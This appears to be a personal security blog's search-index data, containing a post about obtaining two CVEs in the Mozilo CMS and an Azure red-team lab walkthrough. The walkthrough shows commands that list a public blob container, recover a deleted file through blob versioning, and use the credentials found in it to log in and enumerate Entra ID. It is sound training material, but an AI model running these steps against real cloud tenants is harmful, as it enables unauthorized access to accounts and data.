tactics to craft emails and websites that look all too real, hoping you\u0026rsquo;ll bite. In this post, we\u0026rsquo;re going to break down the phishing process from the initial bait to the final hook. You\u0026rsquo;ll learn how these attacks are set up, how to spot them, and what you can do to protect yourself.","title":"Bait, Hook, and Hack"},{"content":"WayBack Three months ago, smack in the middle of my first semester university exams, I found myself pondering a big question: \u0026ldquo;What minor skill can I pick up to keep my hacking chops sharp?\u0026rdquo; Something that would make me feel like a \u0026ldquo;hecker\u0026rdquo; and not just another stressed-out student.\nAnd then, a light bulb moment! 💡 CVEs! I dove headfirst into the wonderful (and sometimes daunting) world of CVEs. I came across three fantastic resources that became my road map to success:\n8 CVEs in 2 Weeks is Crazy – Spoiler: it really is. Tips on Getting Your First CVE – Trust me, this was pure gold! Found a CVE? How to Report – Because finding is one thing, but reporting is a whole different ball game. The Hunt Begins Armed with new knowledge and a thirst for exploits, I decided to go big or go home. I started poking around open-source platforms like GitHub, using some good old-fashioned Google dorks like:\ninurl:\u0026#34;/docs/\u0026#34; \u0026#34;powered by PHP\u0026#34; OR \u0026#34;PHP CMS\u0026#34; I aimed my sights at CMS platforms, focusing primarily on the PHP, Apache2, and MySQL stack. And then, jackpot! 🎰 I hit on a CMS called Mozilo, a popular German CMS. Hecker Mode: Activated!\nThe Workflow of a Hecker So, what did my journey look like from finding the vulnerabilities to getting them published? Let me break it down:\nVulnerability Discovery: After digging around in Mozilo, I found some vulnerabilities that made me raise an eyebrow (or two). Vendor Notification: I immediately reported the vulnerability to the Mozilo team on Aug 19, 2024, at 11:59 AM. To MITRE We Go!: With no vendor response, I submitted the vulnerabilities to MITRE on Aug 19, 2:37 PM, marking the vendor confirmation as “No.” The Waiting Game: The status was set to \u0026ldquo;Reserved\u0026rdquo; on Sep 5, 2:39 PM. Let\u0026rsquo;s Publish!: I sent a publication request to MITRE on Sep 6, 5:19 PM. Patience is a virtue… but I was getting impatient! Success!: Finally, on Sep 10, 5:38 PM, the CVEs were published! 🎉 So… Am I a Hecker Yet? 🤔 I\u0026rsquo;ve been asking myself this question a lot lately. I mean, I’ve got two fresh CVEs to my name, and they’re not just any CVEs – we’re talking Authenticated Remote Code Execution (CVE-2024-44871) and Authenticated Cross-Site Scripting (CVE-2024-44872). You can check them out here if you’re curious:\nCVE-2024-44871 CVE-2024-44872 So, according to the cyber security community, I\u0026rsquo;m starting to make a name for myself. But if you ask my family? Oh, boy. 😅\nYou’d think two CVEs would be enough to prove my “hecker” credentials. Yet, my family still doesn\u0026rsquo;t get it. My mom’s idea of my hacking career? She thinks it\u0026rsquo;s all about recovering her friend’s hacked WhatsApp account.\nMom: \u0026#34;Olaoluwa, can you help recover my friend\u0026#39;s WhatsApp? It\u0026#39;s been hacked!\u0026#34; Me: \u0026#34;Mom, I just found a remote code execution vulnerability in a popular CMS.\u0026#34; Mom: \u0026#34;So… can you get her WhatsApp back or not?\u0026#34; Honestly, I don’t even know where to start with that. 😂 I try explaining that I find vulnerabilities in software, not people’s social media, but to her, all hackers are the same. In her eyes, I’m still a long way from being a \u0026ldquo;real hecker.\u0026rdquo;\nThe Support (or Lack Thereof) Despite the hilarious misunderstanding, my family\u0026rsquo;s support has been unwavering, even if they don\u0026rsquo;t fully understand what I do. From asking me if I’m going to be the next James Bond to warning me about \u0026ldquo;getting caught by the FBI,\u0026rdquo; they\u0026rsquo;ve been there for all my highs and lows. And, hey, at least they\u0026rsquo;re interested in my “hecking,” even if they think it involves more cloak-and-dagger than code and dorks.\nHow Far We\u0026rsquo;ve Come These past few months have been a rollercoaster – from long nights hunting for vulnerabilities to navigating the CVE reporting process. And even though my family doesn’t quite see the gravity of my work, I’ve met some amazing people who do. The cybersecurity community has been incredibly welcoming.\nNew opportunities and connections are coming up all the time, and I’m getting to work on projects that genuinely excite me. Every day is a new adventure – even if it does involve explaining (for the hundredth time) that I can’t actually help anyone recover a hacked Facebook account.\nBut hey, maybe one day I’ll be able to say, “Yes, mom, I’m a real hecker.” Until then, I’ll keep doing what I love, one vulnerability at a time.\nAnd who knows? Maybe next time I’ll find something even bigger… or figure out how to recover that WhatsApp account. 🙃\n","permalink":"http://localhost:1313/hacking/are_you_a_hacker/","summary":"WayBack Three months ago, smack in the middle of my first semester university exams, I found myself pondering a big question: \u0026ldquo;What minor skill can I pick up to keep my hacking chops sharp?\u0026rdquo; Something that would make me feel like a \u0026ldquo;hecker\u0026rdquo; and not just another stressed-out student.\nAnd then, a light bulb moment! 💡 CVEs! I dove headfirst into the wonderful (and sometimes daunting) world of CVEs. I came across three fantastic resources that became my road map to success:","title":"Am I a hecker yet 🤔? CVE-2024-44871 and CVE-2024-44872!"},{"content":"WalkThrough Started a new Azure red team lab series on @Pwnedlabs and it has been fun so far. Thanks to my very good friend, Ayush, who introduced me to this platform.\nAs the blog header says, we can go ahead and start this lab in which we are given a URL, Navigating to the URL, we can see that this is truly hosted on the Azure cloud service.\nPlatform as a service (PaaS) is a complete development and deployment environment in the cloud, with resources that enable you to deliver everything from simple cloud-based apps to sophisticated, cloud-enabled enterprise applications.\nViewing source code we can see that we have a blob URL, This allows for:\nThe storage and management of data, such as documents, images, videos, and backups. The Blob storage service is highly available and can be a cost-effective option. Azure Blob Storage is Microsoft\u0026rsquo;s cloud service for storing large amounts of unstructured data, such as text or binary files, that don\u0026rsquo;t fit into a specific data model. \u0026ldquo;Blob\u0026rdquo; stands for \u0026ldquo;binary large object.\u0026rdquo;\nIt is possible to verify if this endpoint is up by making the following requests, Note that you have to replace /static with /index.html :\nInvoke-WebRequest -Uri \u0026#39;https://mbtwebsite.blob.core.windows.net/$web/index.html\u0026#39; -Method Head StatusCode : 200 StatusDescription : OK Content : RawContent : HTTP/1.1 200 OK ETag: 0x8DBD1A84E6455C0 Server: Windows-Azure-Blob/1.0 Server: Microsoft-HTTPAPI/2.0 x-ms-request-id: 679bb941-301e-0015-523b-105b8c000000 x-ms-version: 2009-09-19 x-ms-lease-status: u… Headers : {[ETag, System.String[]], [Server, System.String[]], [x-ms-request-id, System.String[]], [x-ms-version, System.String[]]…} Images : {} InputFields : {} Links : {} RawContentLength : 0 RelationLink : {} ❯ curl -I https://mbtwebsite.blob.core.windows.net/$web/index.html HTTP/1.1 400 One of the request inputs is out of range. Transfer-Encoding: chunked Server: Blob Service Version 1.0 Microsoft-HTTPAPI/2.0 x-ms-request-id: 87b5de6d-b01e-009d-3243-10be85000000 Date: Thu, 26 Sep 2024 18:41:58 GMT # Note : It is worth using \u0026#39;powershell\u0026#39; or \u0026#39;pwsh\u0026#39; in \u0026#39;kali\u0026#39; We can go ahead and expand the Headers property as this should give us a clear view of this endpoint. You can also do this for the RawContent property.\nPS sec-fortress@Pwn-F0rk-3X3C /home/sec-fortress\u0026gt; Invoke-WebRequest -Uri \u0026#39;https://mbtwebsite.blob.core.windows.net/$web/index.html\u0026#39; -Method Head | Select-Object -ExpandProperty Headers Key Value --- ----- ETag {0x8DBD1A84E6455C0} Server {Windows-Azure-Blob/1.0, Microsoft-HTTPAPI/2.0} x-ms-request-id {9d1c2618-e01e-00bf-2042-107b9a000000} x-ms-version {2009-09-19} x-ms-lease-status {unlocked} x-ms-blob-type {BlockBlob} Date {Thu, 26 Sep 2024 18:31:40 GMT} Content-Length {782359} Content-Type {text/html} Content-MD5 {JSe+sM+pXGAEFInxDgv4CA==} Last-Modified {Fri, 20 Oct 2023 20:08:20 GMT} We can also look into each components of this blob URL at https://mbtwebsite.blob.core.windows.net/$web/index.html\nhttps: The protocol used. Azure Blob Service supports both http and https mbtwebsite: The name of the Azure Storage Account associated with the website. blob.core.windows.net: The Azure Blob Storage Service $web: The name of the container hosting the website, and it is situated within the storage account. (Fuzzable with ffuf) index.html: The web page being requested Note that the container is always bruteforce-able as shown in this blog using tools like ffuf and MicroBurst\nWe can then go ahead and look for sensitive public information on the container /$web with the default blob parameter ?restype=container\u0026amp;comp=list by sending a HTTP requests to the Azure Storage REST API.\nAs shown above there is alot of data and this can be terrible to read, we can set a delimiter to read only directories : ?restype=container\u0026amp;comp=list\u0026amp;delimiter=%2F\nWe can also automate all this process by using Azure-CLI and other methods as specified in both of this blogs ; Blog1, Blog2.\n❯ az storage blob list --account-name mbtwebsite --container-name \u0026#39;$web\u0026#39; --output table However as shown in the above output there isn\u0026rsquo;t any sensitive file found yet, we can go ahead and dig deeper by checking if versioning has been enabled for the container, and if we see any previous versions of files.\n/?restype=container\u0026amp;comp=list\u0026amp;include=versions \u0026ldquo;Blob versioning is a useful feature as it allows point-in-time recovery of individual blobs. A file may no longer exist, but a version of the file will still be stored. Sometimes files are temporarily uploaded for transfer, or maybe deleted after they are found to contain sensitive data\u0026hellip;\u0026rdquo; \u0026ndash; PwnedLabs\nHowever as shown above trying to list previous versions using a browser isn\u0026rsquo;t successful, searching for this error on google i came across a solution from stackoverflow by using the Az-CLI method or curl with the x-ms-version header.\n❯ az rest --method get --url \u0026#39;https://mbtwebsite.blob.core.windows.net/$web?restype=container\u0026amp;comp=list\u0026amp;include=versions\u0026#39; --headers \u0026#34;x-ms-version=2019-10-10\u0026#34; | xmlstarlet fo curl -H \u0026#34;x-ms-version: 2019-10-10\u0026#34; \u0026#39;https://mbtwebsite.blob.core.windows.net/$web?restype=container\u0026amp;comp=list\u0026amp;include=versions\u0026#39; | xmlstarlet fo Using Azure-CLI :\nUsing curl :\nReason : The versions parameter is only supported by version 2019-12-12 and later so it must be specified in our request.\nAs we can see we got an extra scripts-transfer.zip file using this method, we can go ahead and download this using curl. Don\u0026rsquo;t forget to include the versionId parameter and the x-ms-version header in your request :\n❯ curl -H \u0026#34;x-ms-version: 2019-12-12\u0026#34; \u0026#39;https://mbtwebsite.blob.core.windows.net/$web/scripts-transfer.zip?versionId=2024-03-29T20:55:40.8265593Z\u0026#39; --output scripts-transfer.zip % Total % Received % Xferd Average Speed Time Time Time Current Dload Upload Total Spent Left Speed 100 1503 100 1503 0 0 111 0 0:00:13 0:00:13 --:--:-- 354 Then go ahead an unzip the files to a directory :\n❯ mkdir scripts ❯ unzip scripts-transfer.zip -d scripts Archive: scripts-transfer.zip inflating: scripts/entra_users.ps1 inflating: scripts/stale_computer_accounts.ps1 Checking the first powershell script we have credentials for the user marcus\n❯ \\cat entra_users.ps1 # Install the required modules if not already installed # Install-Module -Name Az -Force -Scope CurrentUser # Install-Module -Name MSAL.PS -Force -Scope CurrentUser # Import the required modules Import-Module Az Import-Module MSAL.PS # Define your Azure AD credentials $Username = \u0026#34;marcus@megabigtech.com\u0026#34; $Password = \u0026#34;[REDACTED]\u0026#34; | ConvertTo-SecureString -AsPlainText -Force $Credential = New-Object System.Management.Automation.PSCredential ($Username, $Password) # Authenticate to Azure AD using the specified credentials Connect-AzAccount -Credential $Credential # Define the Microsoft Graph API URL $GraphApiUrl = \u0026#34;https://graph.microsoft.com/v1.0/users?$select=displayName,userPrincipalName\u0026#34; # Retrieve the access token for Microsoft Graph $AccessToken = (Get-AzAccessToken -ResourceType MSGraph).Token # Create a headers hashtable with the access token $headers = @{ \u0026#34;Authorization\u0026#34; = \u0026#34;Bearer $AccessToken\u0026#34; \u0026#34;ContentType\u0026#34; = \u0026#34;application/json\u0026#34; } # Retrieve User Information and Last Sign-In Time using Microsoft Graph via PowerShell $response = Invoke-RestMethod -Uri $GraphApiUrl -Method Get -Headers $headers # Output the response (formatted as JSON) $response | ConvertTo-Json Go ahead and type the following command to initiate the authentication process to log into the Azure account we just discovered with your username and password.\n❯ az login For authentication context we can confirm that we truly have the Azure Account Details of our compromised user :\n❯ az account show { \u0026#34;environmentName\u0026#34;: \u0026#34;AzureCloud\u0026#34;, \u0026#34;homeTenantId\u0026#34;: \u0026#34;xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx\u0026#34;, \u0026#34;id\u0026#34;: \u0026#34;ceff06cb-e29d-4486-a3ae-eaaec5689f94\u0026#34;, \u0026#34;isDefault\u0026#34;: true, \u0026#34;managedByTenants\u0026#34;: [], \u0026#34;name\u0026#34;: \u0026#34;Microsoft Azure Sponsorship\u0026#34;, \u0026#34;state\u0026#34;: \u0026#34;Enabled\u0026#34;, \u0026#34;tenantDefaultDomain\u0026#34;: \u0026#34;megabigtech.com\u0026#34;, \u0026#34;tenantDisplayName\u0026#34;: \u0026#34;Default Directory\u0026#34;, \u0026#34;tenantId\u0026#34;: \u0026#34;xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx\u0026#34;, \u0026#34;user\u0026#34;: { \u0026#34;name\u0026#34;: \u0026#34;marcus@megabigtech.com\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;user\u0026#34; } } You can then navigate to https://portal.azure.com/, to login to the web-based dashboard that manages all of the Azure resources.\nGo ahead and open up the Azure cloud shell with the console icon by the top right\nOnce this is done you should have a cloud console like the below\nUsing this cheatsheet for list of commands i was able to come up with the below command to list the properties of our current user.\nPS /home/marcus\u0026gt; Connect-AzureAD PS /home/marcus\u0026gt; Get-AzureADUser -ObjectId marcus@megabigtech.com | Select-Object -Property * --SNIP-- ObjectId : 41c178d3-c246-4c00-98f0-8113bd631676 ObjectType : User AccountEnabled : True AgeGroup : AssignedLicenses : {} AssignedPlans : {} City : CompanyName : ConsentProvidedForMinor : Country : CreationType : Department : DirSyncEnabled : DisplayName : Marcus Hutch FacsimileTelephoneNumber : GivenName : Marcus IsCompromised : ImmutableId : JobTitle : Flag: [REDACTED] LastDirSyncTime : LegalAgeGroupClassification : Mail : MailNickName : marcus Mobile : OnPremisesSecurityIdentifier : OtherMails : {} PasswordPolicies : PasswordProfile : PhysicalDeliveryOfficeName : PostalCode : PreferredLanguage : ProvisionedPlans : {} ProvisioningErrors : {} ProxyAddresses : {} RefreshTokensValidFromDateTime : 9/26/2024 9:04:50 PM ShowInAddressList : SignInNames : {} SipProxyAddress : State : StreetAddress : Surname : Hutch TelephoneNumber : UsageLocation : UserPrincipalName : marcus@megabigtech.com UserState : UserStateChangedOn : UserType : Member PS /home/marcus\u0026gt; That would be all for today ( -_•)︻デ═一\nReferences \u0026amp; Mitigations Security recommendations for Blob storage Securing Azure Blob Storage: Set-Up Guide Security best practices for Azure Blob Storage ","permalink":"http://localhost:1313/hacking/azure_blob_container_to_initial_access/","summary":"WalkThrough Started a new Azure red team lab series on @Pwnedlabs and it has been fun so far. Thanks to my very good friend, Ayush, who introduced me to this platform.\nAs the blog header says, we can go ahead and start this lab in which we are given a URL, Navigating to the URL, we can see that this is truly hosted on the Azure cloud service.\nPlatform as a service (PaaS) is a complete development and deployment environment in the cloud, with resources that enable you to deliver everything from simple cloud-based apps to sophisticated, cloud-enabled enterprise applications.","title":"Azure Blob Container to Initial Access"},{"content":" ❓ Introduction Hii, I am a 19 yr/old security researcher/penetration tester with extensive networking, scripting, linux administration, active directory and a little cloud experience. Familiarity with security frameworks including OWASP Top 10, Microsoft SDL, MITRE ATT\u0026amp;CK Framework and SANS Top 25. Knowledgeable on defensive security concepts including SIEM and threat hunting. Actively pursuing the OSCP certification and cloud security to further validate proficiency and skill set.\n💻 Infosec, or about 80% of my life My love for Infosec started six years ago. With no mentor or anyone to guide me, I began my journey using TryHackMe.com, YouTube, and Stack Overflow to learn. Later on, I took the Security+ course from ITPro.TV, which allowed me to grasp the basics of cybersecurity, covering areas such as Threats, Attacks, and Vulnerabilities, Cryptography, Cloud and Virtualization, Operational Security, and Incident Response.\nWith this, I was able to continue my learning journey with various other platforms like HackTheBox, PortSwigger, HackMyVM, Vulnix, etc., which gave me a higher advantage in gaining practical experience. Most notably, playing Boot2Root CTFs provided me with an opportunity to join a CTF team called \u0026ldquo;5h4d0wbr0k3r5,\u0026rdquo; giving me a more solid understanding of penetration testing.\nI then landed my first role as a web application penetration tester at a company in India. From there, I secured another job in Nigeria as a network penetration tester, where I gained substantial experience in technical skills like Active Directory and Linux administration. Additionally, I developed soft skills in managing co-workers and working effectively as part of a team.\nI was fortunate to have all my penetration testing exams sponsored, for which I am truly grateful. I have also made a lot of trustworthy and 1337 friends like hac, obx, n16ht4wk, ramsey, rami, fr3y, nerdy, ezequiel and many others including someone who I am really looking upto, @hackingdave. I don\u0026rsquo;t know what the future holds, but continuous learning is key for me. I am eager to apply my skills and knowledge to real-world challenges in a dynamic company where I can contribute to and grow with the team.\n🏅 Courses and certifications This is a non-exhaustive list of certifications and courses I have taken.\nCertified Red Team Professional (badge here)\nCertified Penetration Testing Specialist (badge here)\nDante, Penetration Tester Level II lab (badge here)\nZephyr, Red Team Operator Level I lab (badge here)\nCurrently reading the book “Penetration Testing Azure for Ethical Hackers” by David Okeyode and Karl Fosaaen\nI’m also planning to take the Offensive Security Certified Professional (OSCP) exam this year.\n🪟 Life outside of infosec, the last 20% Outside of cybersecurity, I am also passionate about other things. I enjoy making good food, building positive relationships, watching anime, and listening to good music. I listen to music while doing almost all of my day-to-day activities, which helps me achieve total concentration. Additionally, I am currently pursuing a degree in Criminology and Security Studies (BSc) at an Open University to expand my knowledge in addressing real-world challenges. This program enhances my understanding of criminal behavior and law enforcement, providing a broader perspective on how to protect systems and data from various threats.\n✨ Future plans I plan to pursue in the field of Cloud Security and Penetration Testing. My goal, is never to be the best but to always keep learning, improving, and making a meaningful impact in the field of cybersecurity.\n“The only way to do great work is to love what you do.” – Steve Jobs\n","permalink":"http://localhost:1313/whoami/","summary":"❓ Introduction Hii, I am a 19 yr/old security researcher/penetration tester with extensive networking, scripting, linux administration, active directory and a little cloud experience. Familiarity with security frameworks including OWASP Top 10, Microsoft SDL, MITRE ATT\u0026amp;CK Framework and SANS Top 25. Knowledgeable on defensive security concepts including SIEM and threat hunting. Actively pursuing the OSCP certification and cloud security to further validate proficiency and skill set.\n💻 Infosec, or about 80% of my life My love for Infosec started six years ago.","title":"Whoami"}]